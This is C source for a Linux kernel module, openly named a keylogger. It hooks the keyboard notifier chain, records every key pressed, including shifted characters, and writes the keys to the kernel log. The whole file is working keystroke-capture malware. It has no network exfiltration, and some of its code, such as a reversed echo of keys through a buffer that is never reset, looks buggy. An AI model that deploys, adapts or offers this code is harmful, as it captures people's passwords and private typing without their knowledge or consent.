
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

//Keyboard Keys Mapping
#include "kbduskeymap.h"

// To avoid deadlock
struct semaphore sem;

static int shiftKeyPressed = 0;

// Key value is captured
int keylogger_notify(struct notifier_block *nblock, unsigned long code,
                    void *_param)
{ 
    struct keyboard_notifier_param *param = _param;
    char a[100];
    int i=0,k;
    if (code == KBD_KEYCODE)
    {
        if (param->value==42 || param->value==54)
        {
            down(&sem);
            if (param->down)
                shiftKeyPressed = 1;
            else
                shiftKeyPressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }
	// Key is captured
        if (param->down)
        {
            down(&sem);
            if (shiftKeyPressed == 0)
              {
                    printk(KERN_INFO "%s\n", keymap[param->value]);
                    for(k=0;keymap[param->value][k]!='\0';k++)
                    {
                        a[i]=keymap[param->value][k];
                        i=i+1;
                    }

                    for(k=i-1;k>=0;k--)
                    {
                        printk(KERN_INFO "%c", a[k]);

                    }
              }

                
            else
            {
                //printk(KERN_INFO"Hey I am inside else\n");
                printk(KERN_INFO "%s\n", keymapShiftActivated[param->value]);
            }
            up(&sem);
        }
    }

    return NOTIFY_OK;
}


//Kernel function which get notified of key pressed
static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};


// Insert into module
int init_module(void)
{
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registering the keylogger module with the keyboard "
        "notifier list\n");
    sema_init(&sem, 1);
    return 0;
}


// Remove from kernel
void cleanup_module(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "No keylogger module is found\n");
}

MODULE_LICENSE("GPL");

